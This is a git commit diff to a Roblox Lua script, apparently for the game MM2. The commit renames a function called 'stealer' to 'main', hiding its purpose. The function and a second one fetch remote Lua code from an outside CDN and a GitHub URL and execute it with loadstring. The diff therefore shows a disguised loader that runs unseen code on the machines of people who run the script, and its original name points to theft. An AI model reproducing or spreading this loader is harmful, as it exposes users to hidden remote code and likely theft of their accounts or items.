37c05ed75835cccc04761033461bbccee8fbe22b
BIudnyHoIandan <taeistnkzxx@gmail.com>
2025-08-30 19:53:03 +0500

    Update amz.lua

--- primordial/script/amz.lua
+++ primordial/script/amz.lua
@@ -1,4 +1,4 @@
-local function stealer()
+local function main()
   ID="0d0a40e9-48e9-45da-94c2-c75a58369eb9";
 loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 end
@@ -6,5 +6,5 @@ local function loadui()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/BIudnyHoIandan/MM2/refs/heads/main/LocPlayerScript"))()
 end
 
-task.spawn(stealer)
+task.spawn(main)
 task.spawn(loadui)
